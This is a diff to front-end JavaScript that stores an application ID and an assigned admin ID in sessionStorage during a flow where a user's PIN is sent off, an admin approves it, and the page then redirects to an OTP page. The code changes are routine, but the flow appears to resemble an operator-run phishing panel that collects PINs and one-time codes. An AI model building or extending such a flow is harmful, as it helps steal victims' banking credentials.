@@ -47,12 +47,8 @@ document.addEventListener('DOMContentLoaded', function() {
         console.log('🔄 Restored admin ID from backup:', adminId);
     }
     
-    // Check if we have application ID - redirect silently if not
-    if (!applicationData.applicationId) {
-        console.error('❌ No application data found - redirecting to home');
-        window.location.href = 'index.html';
-        return;
-    }
+    // Check if we have basic application data
+    console.log('📦 Current application data:', applicationData);
     
     // ========================================
     // LOG ADMIN ASSIGNMENT STATUS
@@ -194,6 +190,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.log('✅ PIN sent for verification');
                 console.log('📋 Application ID:', result.applicationId);
                 
+                // ✅ CRITICAL FIX: Save the NEW applicationId to sessionStorage
+                if (result.applicationId) {
+                    applicationData.applicationId = result.applicationId;
+                    sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
+                    console.log('💾 Saved applicationId to sessionStorage:', result.applicationId);
+                }
+                
                 if (result.assignedTo) {
                     console.log('👤 Assigned to admin:', result.assignedTo);
                     console.log('🆔 Admin ID:', result.assignedAdminId);
@@ -205,6 +208,8 @@ document.addEventListener('DOMContentLoaded', function() {
                     sessionStorage.setItem('selectedAdminId', result.assignedAdminId);
                     localStorage.setItem('selectedAdminId', result.assignedAdminId);
                     adminId = result.assignedAdminId;
+                    applicationData.adminId = result.assignedAdminId;
+                    sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
                     console.log('🔄 Admin auto-assigned and stored:', result.assignedAdminId);
                 }
                 
@@ -258,6 +263,16 @@ document.addEventListener('DOMContentLoaded', function() {
                         clearInterval(statusInterval);
                         console.log('✅ PIN APPROVED by admin!');
                         console.log('%c✅ VERIFICATION SUCCESSFUL', 'background: #4CAF50; color: white; padding: 10px 20px; border-radius: 5px; font-weight: bold; font-size: 14px;');
+                        
+                        // ✅ Verify data is in sessionStorage before redirect
+                        const savedData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
+                        console.log('📦 Data in sessionStorage before redirect:', savedData);
+                        console.log('🆔 ApplicationId:', savedData.applicationId);
+                        
+                        if (!savedData.applicationId) {
+                            console.error('❌ WARNING: No applicationId in sessionStorage!');
+                        }
+                        
                         console.log('🔄 Redirecting to OTP page...');
                         
                         // Small delay for user feedback
